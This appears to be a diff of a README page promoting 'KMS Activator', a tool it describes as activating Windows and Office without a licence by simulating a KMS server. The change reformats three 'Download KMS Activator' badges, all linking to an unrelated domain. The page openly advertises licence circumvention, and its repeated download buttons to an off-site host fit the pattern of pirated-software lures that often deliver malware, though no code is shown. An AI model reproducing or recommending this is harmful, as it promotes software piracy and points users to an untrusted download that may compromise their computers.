@@ -4,7 +4,11 @@ In today's world, software licenses can be expensive, especially for essential t
 
 ### What is KMS Activator?
 
-[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-brightgreen?style=for-the-badge&logo=windows)](https://1cinsight.pro/) [![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-2b2b2b?style=for-the-badge&logo=office)](https://1cinsight.pro/)[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-0078d7?style=for-the-badge&logo=microsoft)](https://1cinsight.pro/)
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-brightgreen?style=for-the-badge&logo=windows)](https://1cinsight.pro/) 
+
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-2b2b2b?style=for-the-badge&logo=office)](https://1cinsight.pro/)
+
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-0078d7?style=for-the-badge&logo=microsoft)](https://1cinsight.pro/)
 
 KMS Activator is a utility designed to activate various Microsoft products, including Windows and Office, without the need for an official license. The tool leverages the KMS (Key Management Service) protocol, which Microsoft uses to activate products in bulk for large organizations. KMS Activator simulates a KMS server on your device, tricking the system into thinking it is part of an organization with a valid KMS license.
 
